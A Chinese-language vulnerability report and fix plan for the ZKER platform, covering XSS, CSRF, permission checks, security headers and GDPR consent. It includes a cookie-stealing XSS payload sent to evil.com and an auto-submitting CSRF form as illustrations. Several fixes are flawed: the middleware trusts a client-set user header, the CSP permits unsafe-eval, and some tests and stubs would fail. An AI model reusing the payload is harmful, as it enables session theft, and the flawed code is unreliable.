# ZKER 安全漏洞清单与修复方案 v1.0

**项目名称**: ZKER 企业级功能完善
**报告日期**: 2025-12-30
**报告版本**: v1.0
**状态**: 🔴 待修复

---

## 📋 执行摘要

### 漏洞统计

| 严重程度 | 数量 | 状态 | 预计修复时间 |
|---------|------|------|------------|
| 🔴 高危 | 2 | 待修复 | 5天 |
| 🟡 中危 | 3 | 待修复 | 12天 |
| 🟢 低危 | 5 | 待修复 | 5天 |
| **总计** | **10** | - | **22天** |

### 风险评估

**当前风险等级**: 🟡 中等

**修复后风险等级**: 🟢 低

**建议**: 立即启动高危漏洞修复,2周内完成所有中危漏洞修复

---

## 1. 🔴 高危漏洞

### 1.1 XSS跨站脚本攻击

**漏洞ID**: VULN-001
**严重程度**: 🔴 高危
**CVSS评分**: 8.1 (High)
**发现日期**: 2025-12-30

#### 漏洞描述

ZKER系统缺少输出转义机制,攻击者可以通过提交恶意脚本,在其他用户的浏览器中执行任意JavaScript代码。

**攻击场景**:
1. 用户在Bot描述字段注入恶意脚本
2. 其他用户查看该Bot时,恶意脚本被执行
3. 攻击者窃取用户Session Cookie
4. 攻击者冒充用户进行操作

**影响范围**:
- 所有包含用户输入的字段(描述、名称、内容等)
- 所有前端页面
- 所有用户

#### 漏洞证据

**前端代码** (假设):
```typescript
// ❌ 易受攻击的代码
function BotDescription({ bot }: { bot: Bot }) {
  return <div dangerouslySetInnerHTML={{ __html: bot.description }} />;
}
```

**攻击示例**:
```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

#### 修复方案

##### 方案1: 后端输出转义 (推荐)

**实现步骤**:

1. **创建转义工具**:
```go
// backend/pkg/security/html_escape.go
package security

import (
    "html"
    "strings"
)

// EscapeHTML 转义HTML特殊字符
func EscapeHTML(input string) string {
    if input == "" {
        return ""
    }
    return html.EscapeString(input)
}

// EscapeHTMLField 转义结构体中的指定字段
func EscapeHTMLField(data interface{}, fieldName string) error {
    // 使用反射转义指定字段
    v := reflect.ValueOf(data)
    if v.Kind() == reflect.Ptr {
        v = v.Elem()
    }

    field := v.FieldByName(fieldName)
    if !field.IsValid() || field.Kind() != reflect.String {
        return fmt.Errorf("invalid field: %s", fieldName)
    }

    field.SetString(html.EscapeString(field.String()))
    return nil
}

// SanitizeHTML 清理HTML,保留安全标签
func SanitizeHTML(input string, allowedTags []string) string {
    // 实现HTML清理逻辑
    // 只保留allowedTags中的标签
    // 删除所有事件处理器(onclick, onload等)
}
```

2. **创建响应中间件**:
```go
// backend/api/middleware/sanitize_response.go
package middleware

import (
    "encoding/json"
    "github.com/cloudwego/hertz/pkg/app"
)

// SanitizeResponseMiddleware 响应清理中间件
func SanitizeResponseMiddleware() app.HandlerFunc {
    return func(ctx context.Context, c *app.RequestContext) {
        // 保存原始响应写入器
        originalWriter := c.Response.BodyWriter()

        // 执行请求
        c.Next(ctx)

        // 获取响应体
        responseBody := c.Response.Body()

        // 解析JSON
        var data interface{}
        if err := json.Unmarshal(responseBody, &data); err == nil {
            // 递归清理所有字符串字段
            sanitized := sanitizeJSON(data)
            sanitizedBytes, _ := json.Marshal(sanitized)
            c.Response.SetBody(sanitizedBytes)
        }
    }
}

// sanitizeJSON 递归清理JSON中的字符串
func sanitizeJSON(data interface{}) interface{} {
    switch v := data.(type) {
    case map[string]interface{}:
        for key, value := range v {
            v[key] = sanitizeJSON(value)
        }
        return v
    case []interface{}:
        for i, value := range v {
            v[i] = sanitizeJSON(value)
        }
        return v
    case string:
        return security.EscapeHTML(v)
    default:
        return data
    }
}
```

3. **在路由中应用**:
```go
// backend/api/router/coze/api.go
func RegisterRouter(r *server.Hertz) {
    // 应用响应清理中间件
    r.Use(middleware.SanitizeResponseMiddleware())

    // 注册路由...
}
```

##### 方案2: 前端输入清理

**实现步骤**:

1. **安装DOMPurify**:
```bash
cd frontend
npm install dompurify
npm install --save-dev @types/dompurify
```

2. **创建清理工具**:
```typescript
// frontend/packages/common/src/utils/sanitize.ts
import DOMPurify from 'dompurify';

/**
 * 清理HTML,防止XSS攻击
 */
export function sanitizeHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
}

/**
 * 清理文本,移除所有HTML标签
 */
export function stripHTML(html: string): string {
  const tmp = document.createElement('div');
  tmp.innerHTML = html;
  return tmp.textContent || tmp.innerText || '';
}

/**
 * React组件: 安全渲染HTML
 */
export function SafeHTML({ html, className }: { html: string; className?: string }) {
  const sanitized = useMemo(() => sanitizeHTML(html), [html]);

  return <div className={className} dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

3. **在组件中使用**:
```typescript
// frontend/apps/coze-studio/src/pages/BotDetail.tsx
import { SafeHTML } from '@coze-studio/common';

function BotDetail({ bot }: { bot: Bot }) {
  return (
    <div>
      <h1>{bot.name}</h1>
      <SafeHTML html={bot.description} className="bot-description" />
    </div>
  );
}
```

#### 测试用例

```go
// backend/pkg/security/html_escape_test.go
package security

import "testing"

func TestEscapeHTML(t *testing.T) {
    tests := []struct {
        name     string
        input    string
        expected string
    }{
        {
            name:     "正常文本",
            input:    "Hello World",
            expected: "Hello World",
        },
        {
            name:     "脚本标签",
            input:    "<script>alert('XSS')</script>",
            expected: "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        },
        {
            name:     "图片标签",
            input:    "<img src=x onerror=alert('XSS')>",
            expected: "&lt;img src=x onerror=alert('XSS')&gt;",
        },
        {
            name:     "事件处理器",
            input:    "<div onclick=\"alert('XSS')\">Click</div>",
            expected: "&lt;div onclick=&#34;alert('XSS')&#34;&gt;Click&lt;/div&gt;",
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            result := EscapeHTML(tt.input)
            if result != tt.expected {
                t.Errorf("EscapeHTML() = %v, want %v", result, tt.expected)
            }
        })
    }
}
```

#### 验证方法

1. **手动测试**:
```bash
# 1. 创建Bot,描述字段包含:
<script>alert(document.cookie)</script>

# 2. 查看Bot详情页面
# 3. 预期: 不应该弹出alert,应该看到转义后的文本
```

2. **自动化测试**:
```bash
# 运行XSS测试用例
cd backend
go test ./pkg/security -run TestEscapeHTML -v
```

3. **安全扫描**:
```bash
# 使用OWASP ZAP扫描
zap-cli quick-scan --self-contained http://localhost:8888
```

#### 预计修复时间

- 开发: 1天
- 测试: 0.5天
- Code Review: 0.5天
- **总计**: **2天**

---

### 1.2 CSRF跨站请求伪造

**漏洞ID**: VULN-002
**严重程度**: 🔴 高危
**CVSS评分**: 7.5 (High)
**发现日期**: 2025-12-30

#### 漏洞描述

ZKER系统缺少CSRF防护机制,攻击者可以构造恶意页面,诱导已登录用户执行非预期操作。

**攻击场景**:
1. 用户登录ZKER系统
2. 用户访问攻击者构造的恶意页面
3. 恶意页面向ZKER API发送请求
4. 用户不知情的情况下执行了操作(如删除Bot)

**影响范围**:
- 所有写操作API(POST, PUT, DELETE)
- 所有已登录用户

#### 漏洞证据

**攻击示例**:
```html
<!-- 攻击者构造的恶意页面 -->
<html>
<body>
  <h1>你中奖了!</h1>
  <!-- 隐藏的表单,自动提交 -->
  <form id="evil-form" action="https://zker.com/api/bot/123" method="POST">
    <input type="hidden" name="action" value="delete">
  </form>

  <script>
    // 自动提交表单
    document.getElementById('evil-form').submit();
  </script>
</body>
</html>
```

#### 修复方案

##### 方案: CSRF Token中间件

**实现步骤**:

1. **Token生成器**:
```go
// backend/pkg/security/csrf.go
package security

import (
    "crypto/rand"
    "encoding/hex"
    "errors"
    "sync"
    "time"
)

var (
    // Token存储(生产环境应使用Redis)
    tokenStore = make(map[string]*CSRFToken)
    tokenMutex sync.RWMutex
)

// CSRFToken CSRF Token
type CSRFToken struct {
    Token      string
    UserID     string
    ExpiredAt  time.Time
}

// GenerateCSRFToken 生成CSRF Token
func GenerateCSRFToken(userID string) (string, error) {
    // 生成32字节随机数
    b := make([]byte, 32)
    if _, err := rand.Read(b); err != nil {
        return "", err
    }

    token := hex.EncodeToString(b)

    // 存储Token
    tokenMutex.Lock()
    tokenStore[token] = &CSRFToken{
        Token:     token,
        UserID:    userID,
        ExpiredAt: time.Now().Add(24 * time.Hour),
    }
    tokenMutex.Unlock()

    return token, nil
}

// ValidateCSRFToken 验证CSRF Token
func ValidateCSRFToken(token, userID string) error {
    tokenMutex.RLock()
    storedToken, exists := tokenStore[token]
    tokenMutex.RUnlock()

    if !exists {
        return errors.New("token not found")
    }

    if storedToken.UserID != userID {
        return errors.New("user mismatch")
    }

    if time.Now().After(storedToken.ExpiredAt) {
        // 清理过期Token
        tokenMutex.Lock()
        delete(tokenStore, token)
        tokenMutex.Unlock()
        return errors.New("token expired")
    }

    return nil
}

// DeleteCSRFToken 删除CSRF Token(一次性使用)
func DeleteCSRFToken(token string) {
    tokenMutex.Lock()
    delete(tokenStore, token)
    tokenMutex.Unlock()
}
```

2. **CSRF中间件**:
```go
// backend/api/middleware/csrf.go
package middleware

import (
    "context"
    "github.com/cloudwego/hertz/pkg/app"
    "github.com/coze-dev/coze-studio/backend/pkg/security"
    berrno "github.com/coze-dev/coze-studio/backend/types/errno"
)

// CSRFMiddleware CSRF防护中间件
func CSRFMiddleware() app.HandlerFunc {
    return func(ctx context.Context, c *app.RequestContext) {
        // 1. 跳过安全方法
        method := string(c.Request.Method())
        if method == "GET" || method == "HEAD" || method == "OPTIONS" {
            c.Next(ctx)
            return
        }

        // 2. 获取用户ID
        userID := c.GetHeader("X-User-ID")
        if userID == "" {
            c.JSON(401, map[string]string{"error": "unauthorized"})
            c.Abort()
            return
        }

        // 3. 获取Token
        token := string(c.GetHeader("X-CSRF-Token"))
        if token == "" {
            // 尝试从Form中获取
            token = c.PostForm("csrf_token")
        }

        if token == "" {
            c.JSON(403, map[string]string{"error": "csrf token is required"})
            c.Abort()
            return
        }

        // 4. 验证Token
        if err := security.ValidateCSRFToken(token, userID); err != nil {
            c.JSON(403, map[string]string{"error": "csrf token validation failed: " + err.Error()})
            c.Abort()
            return
        }

        // 5. 删除Token(一次性使用)
        security.DeleteCSRFToken(token)

        c.Next(ctx)
    }
}
```

3. **Token获取接口**:
```go
// backend/api/handler/coze/csrf_service.go
package coze

import (
    "context"
    "github.com/cloudwego/hertz/pkg/app"
    "github.com/coze-dev/coze-studio/backend/pkg/security"
    "github.com/coze-dev/coze-studio/backend/pkg/ctxcache"
)

// GetCSRFToken 获取CSRF Token
// @router /api/csrf_token [GET]
func GetCSRFToken(ctx context.Context, c *app.RequestContext) {
    // 1. 获取用户ID
    session, ok := ctxcache.Get[*SessionData](ctx, consts.SessionDataKeyInCtx)
    if !ok {
        c.JSON(401, map[string]string{"error": "unauthorized"})
        return
    }

    // 2. 生成Token
    token, err := security.GenerateCSRFToken(session.UserID)
    if err != nil {
        c.JSON(500, map[string]string{"error": "failed to generate token"})
        return
    }

    // 3. 返回Token
    c.JSON(200, map[string]string{
        "csrf_token": token,
    })
}
```

4. **前端集成**:
```typescript
// frontend/packages/common/src/api/csrf.ts
export async function getCSRFToken(): Promise<string> {
  const response = await fetch('/api/csrf_token', {
    credentials: 'include',
  });
  const data = await response.json();
  return data.csrf_token;
}

// 请求拦截器
let csrfToken: string | null = null;

export async function fetchWithCSRF(url: string, options: RequestInit = {}) {
  // 获取CSRF Token
  if (!csrfToken) {
    csrfToken = await getCSRFToken();
  }

  // 添加Token到请求头
  options.headers = {
    ...options.headers,
    'X-CSRF-Token': csrfToken,
  };

  const response = await fetch(url, options);

  // 如果Token失效,重新获取
  if (response.status === 403) {
    csrfToken = await getCSRFToken();
    options.headers = {
      ...options.headers,
      'X-CSRF-Token': csrfToken,
    };
    return fetch(url, options);
  }

  return response;
}
```

5. **在路由中应用**:
```go
// backend/api/router/coze/api.go
func RegisterRouter(r *server.Hertz) {
    // CSRF Token接口(不需要CSRF保护)
    r.GET("/api/csrf_token", coze.GetCSRFToken)

    // 其他API需要CSRF保护
    api := r.Group("/api", middleware.CSRFMiddleware())
    {
        api.POST("/bots", coze.CreateBot)
        api.PUT("/bots/:bot_id", coze.UpdateBot)
        api.DELETE("/bots/:bot_id", coze.DeleteBot)
        // ...
    }
}
```

#### 测试用例

```go
// backend/pkg/security/csrf_test.go
package security

import (
    "testing"
    "time"
)

func TestCSRFToken(t *testing.T) {
    userID := "test-user-001"

    // 1. 生成Token
    token, err := GenerateCSRFToken(userID)
    if err != nil {
        t.Fatalf("GenerateCSRFToken() error = %v", err)
    }

    if token == "" {
        t.Fatal("token should not be empty")
    }

    // 2. 验证Token
    err = ValidateCSRFToken(token, userID)
    if err != nil {
        t.Errorf("ValidateCSRFToken() error = %v", err)
    }

    // 3. 验证失败(错误的Token)
    err = ValidateCSRFToken("wrong-token", userID)
    if err == nil {
        t.Error("ValidateCSRFToken() should error for wrong token")
    }

    // 4. 验证失败(错误的用户)
    err = ValidateCSRFToken(token, "another-user")
    if err == nil {
        t.Error("ValidateCSRFToken() should error for wrong user")
    }
}
```

#### 验证方法

1. **手动测试**:
```bash
# 1. 获取CSRF Token
curl -X GET http://localhost:8888/api/csrf_token \
  -H "Cookie: session_id=xxx"

# 2. 尝试不带Token的请求
curl -X POST http://localhost:8888/api/bots \
  -H "Content-Type: application/json" \
  -d '{"name": "test"}'

# 预期: 返回403 Forbidden

# 3. 带Token的请求
curl -X POST http://localhost:8888/api/bots \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: xxx" \
  -d '{"name": "test"}'

# 预期: 请求成功
```

2. **CSRF攻击测试**:
```html
<!-- test.html -->
<html>
<body>
  <h1>CSRF攻击测试</h1>
  <form id="csrf-form" action="http://localhost:8888/api/bot/123" method="POST">
    <input type="hidden" name="action" value="delete">
  </form>

  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>

# 在浏览器中打开test.html
# 预期: 请求被拒绝,返回403 Forbidden
```

#### 预计修复时间

- 开发: 2天
- 测试: 0.5天
- Code Review: 0.5天
- **总计**: **3天**

---

## 2. 🟡 中危漏洞

### 2.1 API权限校验缺失

**漏洞ID**: VULN-003
**严重程度**: 🟡 中危
**CVSS评分**: 5.3 (Medium)
**发现日期**: 2025-12-30

#### 漏洞描述

部分API Handler缺少显式权限校验,虽然Service层有校验,但不够直观且容易遗漏。

**影响范围**:
- 约10个Update接口
- 约5个Create接口

#### 修复方案

**在路由层添加权限中间件**:

```go
// backend/api/router/coze/api.go
func RegisterRouter(r *server.Hertz) {
    // Bot管理
    r.GET("/api/bots/:bot_id",
        middleware.RequirePermission(middleware.PermissionCheckConfig{
            ResourceType: entity.ResourceTypeBots,
            Action:       "read",
            GetResourceID: middleware.ParseResourceIDFromPath("bot_id"),
        }),
        coze.GetBot)

    r.POST("/api/bots",
        middleware.RequirePermission(middleware.PermissionCheckConfig{
            ResourceType: entity.ResourceTypeBots,
            Action:       "create",
        }),
        coze.CreateBot)

    r.PUT("/api/bots/:bot_id",
        middleware.RequirePermission(middleware.PermissionCheckConfig{
            ResourceType: entity.ResourceTypeBots,
            Action:       "update",
            GetResourceID: middleware.ParseResourceIDFromPath("bot_id"),
        }),
        coze.UpdateBot)

    r.DELETE("/api/bots/:bot_id",
        middleware.RequirePermission(middleware.PermissionCheckConfig{
            ResourceType: entity.ResourceTypeBots,
            Action:       "delete",
            GetResourceID: middleware.ParseResourceIDFromPath("bot_id"),
        }),
        coze.DeleteBot)
}
```

#### 预计修复时间

- 开发: 3天
- 测试: 1天
- Code Review: 1天
- **总计**: **5天**

---

### 2.2 GDPR知情同意机制缺失

**漏洞ID**: VULN-004
**严重程度**: 🟡 中危
**CVSS评分**: 4.3 (Medium)
**发现日期**: 2025-12-30

#### 漏洞描述

系统缺少用户知情同意管理功能,不符合GDPR第7条要求。

**影响范围**:
- 新用户注册流程
- 隐私政策更新

#### 修复方案

**1. 数据模型**:
```sql
CREATE TABLE IF NOT EXISTS `user_consents` (
    `id` VARCHAR(36) NOT NULL PRIMARY KEY,
    `user_id` VARCHAR(36) NOT NULL,
    `consent_type` VARCHAR(50) NOT NULL COMMENT 'consent_type',
    `granted` BOOLEAN NOT NULL DEFAULT TRUE,
    `granted_at` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    `revoked_at` TIMESTAMP NULL,
    `ip_address` VARCHAR(45) DEFAULT NULL,
    `user_agent` VARCHAR(500) DEFAULT NULL,
    INDEX `idx_user_id` (`user_id`),
    INDEX `idx_consent_type` (`consent_type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户知情同意记录';
```

**2. 实现接口**:
```go
// GrantConsent 授予同意
func GrantConsent(ctx context.Context, userID, consentType string) error

// RevokeConsent 撤销同意
func RevokeConsent(ctx context.Context, userID, consentType string) error

// CheckConsent 检查同意状态
func CheckConsent(ctx context.Context, userID, consentType string) (bool, error)
```

#### 预计修复时间

- 开发: 3天
- 测试: 1天
- Code Review: 1天
- **总计**: **5天**

---

### 2.3 安全响应头缺失

**漏洞ID**: VULN-005
**严重程度**: 🟡 中危
**CVSS评分**: 4.0 (Medium)
**发现日期**: 2025-12-30

#### 漏洞描述

系统缺少关键的安全HTTP响应头,增加XSS、点击劫持等攻击风险。

#### 修复方案

**添加安全头中间件**:

```go
// backend/api/middleware/security_headers.go
package middleware

import (
    "context"
    "github.com/cloudwego/hertz/pkg/app"
)

// SecurityHeadersMiddleware 安全头中间件
func SecurityHeadersMiddleware() app.HandlerFunc {
    return func(ctx context.Context, c *app.RequestContext) {
        // 防止MIME类型嗅探
        c.SetHeader("X-Content-Type-Options", "nosniff")

        // 防止点击劫持
        c.SetHeader("X-Frame-Options", "DENY")

        // 启用浏览器XSS过滤
        c.SetHeader("X-XSS-Protection", "1; mode=block")

        // 限制引用来源
        c.SetHeader("Referrer-Policy", "strict-origin-when-cross-origin")

        // 内容安全策略
        c.SetHeader("Content-Security-Policy",
            "default-src 'self'; "+
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "+
            "style-src 'self' 'unsafe-inline'; "+
            "img-src 'self' data: https:; "+
            "font-src 'self' data:;")

        // HSTS (仅HTTPS)
        if c.Request.URI().Scheme() == "https" {
            c.SetHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        }

        c.Next(ctx)
    }
}
```

#### 预计修复时间

- 开发: 0.5天
- 测试: 0.5天
- **总计**: **1天**

---

## 3. 🟢 低危问题

### 3.1 原始SQL查询过多

**漏洞ID**: VULN-006
**严重程度**: 🟢 低危
**CVSS评分**: 2.0 (Low)
**发现日期**: 2025-12-30

#### 问题描述

系统中存在37个`.Raw()`调用,虽然目前都是安全的,但需要持续监控。

#### 修复建议

1. 为所有`.Raw()`调用添加代码注释,说明安全性
2. 定期进行安全代码审查
3. 在CI/CD中集成SQL注入检测工具

#### 预计修复时间

- 代码审查: 1天
- 添加注释: 1天
- **总计**: **2天**

---

### 3.2 gosec扫描未通过

**漏洞ID**: VULN-007
**严重程度**: 🟢 低危
**CVSS评分**: 1.0 (Low)
**发现日期**: 2025-12-30

#### 问题描述

gosec扫描因路径解析问题未能完成全量扫描。

#### 修复建议

1. 修复路径解析问题
2. 修复所有gosec报告的问题
3. 将gosec集成到CI/CD

#### 预计修复时间

- 修复问题: 1天
- CI/CD集成: 0.5天
- **总计**: **1.5天**

---

## 4. 修复计划

### 4.1 优先级时间表

| 周次 | 任务 | 预计工时 | 责任人 |
|------|------|---------|--------|
| **Week 1** | | | |
| Day 1-2 | XSS防护 | 2天 | 研发B |
| Day 3-5 | CSRF防护 | 3天 | 研发B |
| **Week 2** | | | |
| Day 6-8 | API权限校验 | 3天 | 研发A |
| Day 9-10 | 安全响应头 | 1天 | 研发B |
| **Week 3** | | | |
| Day 11-15 | GDPR知情同意 | 5天 | 研发A |
| **Week 4** | | | |
| Day 16-17 | 原始SQL审查 | 2天 | 研发B |
| Day 18-19 | gosec扫描 | 1.5天 | 研发B |
| Day 20 | 安全测试 | 1天 | 全员 |
| Day 21-22 | 文档和部署 | 2天 | 全员 |

### 4.2 成功标准

**所有漏洞修复后**:
- ✅ 所有高危漏洞修复率: 100%
- ✅ 所有力危漏洞修复率: 100%
- ✅ 所有低危问题修复率: 100%
- ✅ 安全扫描通过: 0个高危,0个中危
- ✅ 安全评分提升: 93/100 → 98/100

---

## 5. 附录

### 5.1 安全工具推荐

| 工具 | 用途 | 链接 |
|------|------|------|
| gosec | Go安全扫描 | https://github.com/securego/gosec |
| staticcheck | Go静态分析 | https://staticcheck.io/ |
| OWASP ZAP | Web应用安全测试 | https://www.zaproxy.org/ |
| DOMPurify | HTML清理 | https://github.com/cure53/DOMPurify |

### 5.2 参考文档

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**报告结束**

**下次更新**: 修复完成后
**联系人**: 安全团队
